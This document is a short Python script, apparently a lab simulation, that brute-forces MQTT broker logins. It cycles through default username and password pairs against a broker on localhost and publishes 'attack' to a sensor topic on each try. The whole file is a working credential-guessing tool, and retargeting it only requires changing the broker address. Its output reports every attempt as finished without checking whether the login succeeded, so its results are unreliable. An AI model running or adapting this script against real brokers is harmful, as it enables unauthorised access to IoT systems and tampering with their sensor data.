# mqtt_bruteforce_sim_safe.py
from paho.mqtt import client as mqtt_client
import time
import socket

BROKER = '127.0.0.1'
PORT = 1883
USERNAMES = ['admin','root','user','test']
PASSWORDS = ['1234','password','admin','mqtt','']
TOPIC = "sensors/temp"

def try_connect(user, pwd, attempt):
    client_id = f"sim-{os.getpid()}-{attempt}"
    try:
        c = mqtt_client.Client(client_id=client_id)
        c.username_pw_set(user, pwd)
        c.connect(BROKER, PORT, 5)
        c.loop_start()
        c.publish(TOPIC, "attack")
        c.loop_stop()
        c.disconnect()
        print("Tried", user, pwd, "-> success/connect attempt finished")
    except ConnectionRefusedError as cre:
        print("ConnectionRefused for", user, pwd, cre)
    except socket.timeout as st:
        print("Timeout for", user, pwd, st)
    except Exception as e:
        print("Error", user, pwd, type(e).__name__, e)

if __name__ == "__main__":
    import os
    attempt = 0
    for u in USERNAMES:
        for p in PASSWORDS:
            attempt += 1
            try_connect(u, p, attempt)
            time.sleep(0.2)  # be polite; avoid hammering
